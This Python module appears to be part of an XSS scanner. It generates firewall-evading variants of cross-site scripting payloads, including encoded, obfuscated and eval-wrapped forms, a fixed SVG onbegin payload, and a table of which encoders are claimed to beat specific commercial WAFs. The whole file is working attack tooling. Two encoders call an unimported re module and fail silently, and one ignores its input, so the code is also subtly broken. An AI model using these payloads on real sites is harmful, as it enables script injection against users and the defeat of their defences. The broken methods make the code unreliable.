"""
Payload Encoder Chain — Dalfox-style parallel encoder for WAF bypass.

Provides multiple encoding strategies that can be applied individually
or chained together to produce WAF-evading payload variants.
"""

import base64
import random
import urllib.parse
from typing import List, Optional


_XSS_CHARS = {
    '<': {'html': '&lt;', 'hex': '&#x3C;', 'dec': '&#60;', 'url': '%3C', 'unicode': '\\u003c', 'octal': '\\074'},
    '>': {'html': '&gt;', 'hex': '&#x3E;', 'dec': '&#62;', 'url': '%3E', 'unicode': '\\u003e', 'octal': '\\076'},
    '"': {'html': '&quot;', 'hex': '&#x22;', 'dec': '&#34;', 'url': '%22', 'unicode': '\\u0022', 'octal': '\\042'},
    "'": {'html': '&#39;', 'hex': '&#x27;', 'dec': '&#39;', 'url': '%27', 'unicode': '\\u0027', 'octal': '\\047'},
    '(': {'html': '&#40;', 'hex': '&#x28;', 'dec': '&#40;', 'url': '%28', 'unicode': '\\u0028', 'octal': '\\050'},
    ')': {'html': '&#41;', 'hex': '&#x29;', 'dec': '&#41;', 'url': '%29', 'unicode': '\\u0029', 'octal': '\\051'},
    '/': {'html': '&#47;', 'hex': '&#x2F;', 'dec': '&#47;', 'url': '%2F', 'unicode': '\\u002f', 'octal': '\\057'},
    ' ': {'html': '&#32;', 'hex': '&#x20;', 'dec': '&#32;', 'url': '%20', 'unicode': '\\u0020', 'octal': '\\040'},
    '=': {'html': '&#61;', 'hex': '&#x3D;', 'dec': '&#61;', 'url': '%3D', 'unicode': '\\u003d', 'octal': '\\075'},
}

_CASE_TARGETS = [
    'script', 'alert', 'confirm', 'prompt', 'onerror', 'onload',
    'onfocus', 'onclick', 'onmouseover', 'img', 'svg', 'body',
    'iframe', 'input', 'details', 'marquee', 'eval',
]

ENCODER_REGISTRY = {
    'url':           'url_encode',
    'double-url':    'double_url_encode',
    'html':          'html_entity_encode',
    'html-hex':      'html_hex_encode',
    'unicode':       'unicode_encode',
    'js-octal':      'js_octal_encode',
    'base64':        'base64_encode',
    'mixed-case':    'mixed_case',
    'null-byte':     'null_byte_inject',
    'comment':       'comment_break',
    'fullwidth':     'fullwidth_encode',
    'zero-width':    'zero_width_inject',
    'attr-entity':   'html_entity_in_attribute',
    'svg-animate':   'svg_animate_payload',
    'obj-concat':    'object_concat',
    'proto-call':    'prototype_call',
    'unicode-escape':'unicode_escape_js',
}


class PayloadEncoder:
    """
    Multi-strategy payload encoder for WAF evasion.

    Each method takes a raw XSS payload and returns an encoded variant.
    ``apply_chain`` applies one or more encoders in sequence and returns
    a list of all unique variants.
    """


    def url_encode(self, payload: str) -> str:
        """Standard percent-encoding of XSS-significant chars."""
        return urllib.parse.quote(payload, safe='')

    def double_url_encode(self, payload: str) -> str:
        """Double percent-encoding — bypasses WAFs that decode once."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

    def html_entity_encode(self, payload: str) -> str:
        """Replace XSS chars with named / decimal HTML entities."""
        out = []
        for ch in payload:
            if ch in _XSS_CHARS:
                out.append(_XSS_CHARS[ch]['html'])
            else:
                out.append(ch)
        return ''.join(out)

    def html_hex_encode(self, payload: str) -> str:
        """Replace XSS chars with hex HTML entities (&#xNN;)."""
        out = []
        for ch in payload:
            if ch in _XSS_CHARS:
                out.append(_XSS_CHARS[ch]['hex'])
            else:
                out.append(ch)
        return ''.join(out)

    def unicode_encode(self, payload: str) -> str:
        r"""Replace XSS chars with JS unicode escapes (\u00NN)."""
        out = []
        for ch in payload:
            if ch in _XSS_CHARS:
                out.append(_XSS_CHARS[ch]['unicode'])
            else:
                out.append(ch)
        return ''.join(out)

    def js_octal_encode(self, payload: str) -> str:
        r"""Replace XSS chars with JS octal escapes (\NNN)."""
        out = []
        for ch in payload:
            if ch in _XSS_CHARS:
                out.append(_XSS_CHARS[ch]['octal'])
            else:
                out.append(ch)
        return ''.join(out)

    def base64_encode(self, payload: str) -> str:
        """Wrap payload in atob() for base64-based execution."""
        b64 = base64.b64encode(payload.encode()).decode()
        return f'eval(atob("{b64}"))'

    def mixed_case(self, payload: str) -> str:
        """Randomise case of HTML tags and JS keywords (ScRiPt, aLeRt)."""
        result = payload
        for token in _CASE_TARGETS:
            if token.lower() in result.lower():
                mixed = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in token
                )
                import re
                result = re.sub(re.escape(token), mixed, result, count=1, flags=re.IGNORECASE)
        return result

    def null_byte_inject(self, payload: str) -> str:
        """Insert %00 between tag name and attributes to confuse parsers."""
        import re
        def _inject(m):
            tag = m.group(1)
            mid = len(tag) // 2
            return f'<{tag[:mid]}%00{tag[mid:]}'
        return re.sub(r'<(\w{3,})', _inject, payload)

    def comment_break(self, payload: str) -> str:
        """Insert HTML/JS comments inside keywords: scr/**/ipt, al/**/ert."""
        import re
        result = payload
        for token in _CASE_TARGETS:
            if token.lower() in result.lower():
                mid = len(token) // 2
                broken = f'{token[:mid]}/**/{token[mid:]}'
                result = re.sub(re.escape(token), broken, result, count=1, flags=re.IGNORECASE)
        return result


    def apply_chain(self, payload: str, encoders: List[str]) -> List[str]:
        """
        Apply each encoder in *encoders* to *payload* and return all
        **unique** variants (original NOT included).

        Parameters
        ----------
        payload : str
            Raw XSS payload.
        encoders : list[str]
            Encoder names from ``ENCODER_REGISTRY`` (e.g. ``['url', 'html', 'mixed-case']``).
            Special value ``'all'`` expands to every registered encoder.

        Returns
        -------
        list[str]
            De-duplicated list of encoded variants.
        """
        if 'all' in encoders:
            encoders = list(ENCODER_REGISTRY.keys())

        variants: List[str] = []
        seen = {payload}  # exclude the original
        for enc_name in encoders:
            method_name = ENCODER_REGISTRY.get(enc_name)
            if not method_name:
                continue
            method = getattr(self, method_name, None)
            if not method:
                continue
            try:
                encoded = method(payload)
                if encoded and encoded not in seen:
                    seen.add(encoded)
                    variants.append(encoded)
            except Exception:
                continue

        return variants


    def fullwidth_encode(self, payload: str) -> str:
        """
        Replace ASCII XSS chars with Unicode full-width equivalents.
        Some WAFs compare against ASCII chars without normalizing Unicode first.
        """
        FULLWIDTH = {
            '<': '\uff1c', '>': '\uff1e', '"': '\uff02',
            "'": '\uff07', '/': '\uff0f', '(': '\uff08',
            ')': '\uff09', '=': '\uff1d', ' ': '\u3000',
        }
        return ''.join(FULLWIDTH.get(c, c) for c in payload)

    def zero_width_inject(self, payload: str) -> str:
        """
        Inject zero-width spaces between keyword characters.
        Breaks WAF string matching while browser ignores the invisible chars.
        Only injects inside keyword tokens, not between < > chars.
        """
        ZERO_WIDTH = '\u200b'
        KEYWORDS = ['script', 'alert', 'onerror', 'onload', 'eval', 'confirm']
        result = payload
        for kw in KEYWORDS:
            if kw in result.lower():
                broken = ZERO_WIDTH.join(list(kw))
                result = re.sub(re.escape(kw), broken, result, flags=re.IGNORECASE)
        return result

    def html_entity_in_attribute(self, payload: str) -> str:
        """
        Encode JS function calls using HTML entities inside attribute values.
        <img onerror="&#97;lert(1)"> — WAF sees no 'alert', browser decodes and executes.
        Only encodes the first char of common JS functions.
        """
        FIRST_CHAR_MAP = {
            'alert':   '&#97;lert',
            'prompt':  '&#112;rompt',
            'confirm': '&#99;onfirm',
            'eval':    '&#101;val',
        }
        result = payload
        for func, encoded in FIRST_CHAR_MAP.items():
            result = re.sub(re.escape(func), encoded, result, flags=re.IGNORECASE)
        return result

    def svg_animate_payload(self, payload: str) -> str:
        """
        Wrap payload in SVG animate* elements.
        Many WAFs blocklist <script> and common event handlers but miss
        SVG animation element events like onbegin.
        """
        return '<svg><animatetransform onbegin=alert(1) attributeName=transform>'

    def object_concat(self, payload: str) -> str:
        """
        Replace alert(1) with object bracket notation + string concatenation.
        window["ale"+"rt"](1) — bypasses keyword-based WAF rules.
        """
        if 'alert(1)' in payload:
            return payload.replace('alert(1)', 'window["ale"+"rt"](1)')
        if 'alert(' in payload:
            return payload.replace('alert(', '["ale"+"rt"](')
        return payload

    def prototype_call(self, payload: str) -> str:
        """
        Replace alert(1) with Function constructor via prototype chain.
        []["constructor"]["constructor"]("alert(1)")() — heavy obfuscation.
        """
        if 'alert(1)' in payload:
            return payload.replace(
                'alert(1)',
                '[]["constructor"]["constructor"]("alert(1)")()'
            )
        return payload

    def unicode_escape_js(self, payload: str) -> str:
        """
        Replace 'alert' with unicode escape sequence valid in JS identifiers.
        \u0061lert(1) — JS engine resolves unicode escapes, WAF may not.
        """
        if 'alert' in payload:
            return payload.replace('alert', '\\u0061lert')
        return payload

    def get_waf_encoders(self, waf_name: Optional[str] = None) -> List[str]:
        """
        Return the most effective encoder names for a given WAF.

        When no WAF is specified, a small default set is returned.
        """
        if not waf_name:
            return ['mixed-case', 'html-hex', 'double-url']

        waf = waf_name.lower()

        if waf == 'cloudflare':
            return ['mixed-case', 'unicode', 'comment', 'double-url']
        elif waf == 'akamai':
            return ['html-hex', 'unicode', 'null-byte', 'double-url']
        elif waf in ('imperva', 'incapsula'):
            return ['unicode', 'double-url', 'comment', 'mixed-case']
        elif waf == 'sucuri':
            return ['double-url', 'html-hex', 'comment', 'null-byte']
        elif waf in ('modsecurity', 'owasp'):
            return ['mixed-case', 'comment', 'html-hex', 'null-byte']
        elif waf in ('f5', 'bigip', 'big-ip'):
            return ['unicode', 'js-octal', 'double-url']
        elif waf in ('aws', 'awswaf', 'aws waf'):
            return ['html-hex', 'mixed-case', 'unicode', 'null-byte']
        elif waf == 'wordfence':
            return ['comment', 'mixed-case', 'double-url', 'html-hex']
        else:
            return ['mixed-case', 'html-hex', 'double-url', 'unicode', 'comment']
